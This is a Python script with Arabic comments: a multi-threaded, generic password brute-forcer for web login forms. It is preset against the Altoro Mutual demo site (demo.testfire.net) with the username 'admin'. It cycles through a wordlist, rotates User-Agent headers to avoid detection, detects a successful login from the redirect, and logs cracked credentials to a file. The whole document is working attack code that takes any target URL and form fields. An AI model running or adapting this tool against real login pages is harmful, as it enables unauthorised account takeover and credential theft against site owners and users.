#!/usr/bin/env python3
import requests
import threading
import sys
import random
from queue import Queue


# ==========================================
# إعدادات الألوان والتنسيق
# ==========================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'


# ==========================================
# الفئة الرئيسية للأداة (Universal Brute Forcer)
# ==========================================
class UniversalBruteForcer:
    # تم تعديل اسم المتغير هنا ليكون wordlist ليتطابق مع الاستدعاء
    def __init__(self, target_url, username, wordlist, user_field, pass_field, thread_count=5):
        self.target_url = target_url
        self.username = username
        self.wordlist = wordlist  # تم توحيد الاسم هنا
        self.user_field = user_field
        self.pass_field = pass_field
        self.thread_count = thread_count
        self.queue = Queue()
        self.stop_flag = False

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
        ]

        self.load_wordlist()

    def load_wordlist(self):
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    self.queue.put(line.strip())
            print(f"{Colors.BLUE}[*] Loaded {self.queue.qsize()} passwords.{Colors.END}")
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Error: Wordlist file '{self.wordlist}' not found!{Colors.END}")
            print(f"{Colors.YELLOW}[i] Please create a file named 'passwords.txt' with 'admin' inside it.{Colors.END}")
            sys.exit()

    def attack(self):
        while not self.queue.empty() and not self.stop_flag:
            password = self.queue.get()

            data = {
                self.user_field: self.username,
                self.pass_field: password,
                'btnSubmit': 'Login'
            }

            headers = {'User-Agent': random.choice(self.user_agents)}

            try:
                sys.stdout.write(f"\r{Colors.YELLOW}[Testing] {password:<15} {Colors.END}")
                sys.stdout.flush()

                response = requests.post(
                    self.target_url,
                    data=data,
                    headers=headers,
                    timeout=5,
                    allow_redirects=False
                )

                if response.status_code == 302 or "main.jsp" in response.headers.get('Location', ''):
                    print(f"\n{Colors.GREEN}{Colors.BOLD}[+] PASSWORD FOUND: {password}{Colors.END}")

                    with open("cracked_log.txt", "a") as f:
                        f.write(f"USER: {self.username} | PASS: {password}\n")

                    self.stop_flag = True
                    return

            except Exception:
                pass
            finally:
                self.queue.task_done()

    def start(self):
        print(f"{Colors.GREEN}\n--- FINAL ACCESS ATTACK TOOL (Multi-Threaded) ---{Colors.END}")
        print(f"{Colors.BLUE}[*] Target: {self.target_url}")
        print(f"[*] User: {self.username}")
        print(f"[*] Threads: {self.thread_count}{Colors.END}\n")

        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if not self.stop_flag:
            print(f"\n{Colors.RED}[X] Password not found in the list.{Colors.END}")


# ==========================================
# الإعدادات المسبقة للتشغيل التلقائي
# ==========================================
if __name__ == "__main__":

    # 1. إعدادات الموقع الهدف (Altoro Mutual)
    TARGET_URL = "http://demo.testfire.net/login.jsp"

    # 2. البيانات الثابتة للموقع
    USERNAME = "admin"
    USER_FIELD = "uid"
    PASS_FIELD = "passw"
    WORDLIST_FILE = "passwords.txt"  # مربوط بالملف في نفس المجلد

    # التأكد من تثبيت المكتبات قبل التشغيل
    try:
        import requests
    except ImportError:
        print(f"{Colors.RED}ERROR: Please run 'pip install requests' first.{Colors.END}")
        sys.exit()

    # تشغيل الأداة
    tool = UniversalBruteForcer(
        target_url=TARGET_URL,
        username=USERNAME,
        wordlist=WORDLIST_FILE,  # تم تغيير اسم المتغير هنا
        user_field=USER_FIELD,
        pass_field=PASS_FIELD,
        thread_count=5
    )

    try:
        tool.start()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Exiting...{Colors.END}")
        sys.exit()